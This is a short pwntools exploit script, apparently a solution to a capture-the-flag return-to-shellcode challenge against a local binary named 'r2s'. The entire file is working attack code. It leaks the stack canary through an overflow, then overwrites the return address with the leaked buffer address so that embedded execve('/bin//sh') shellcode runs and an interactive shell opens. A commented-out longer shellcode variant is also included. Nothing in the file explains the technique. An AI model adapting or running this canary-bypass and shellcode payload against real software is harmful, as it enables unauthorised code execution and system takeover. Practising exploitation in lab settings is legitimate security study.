from pwn import *

p = process('./r2s')


p.recvuntil(b"buf: ")
buf_addr = int(p.recvline()[:-1], 16)


buf = b"a"*0x59
p.sendafter(b"Input: ", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recv(7))
print(hex(cnry))
# 31 Bytes
#shell = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
# 23 Bytes 
shell = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
buf = shell + b"a" * (0x58 - len(shell)) + p64(cnry) + b"a"*0x8 + p64(buf_addr)

p.sendlineafter(b"Input: ", buf)

p.interactive()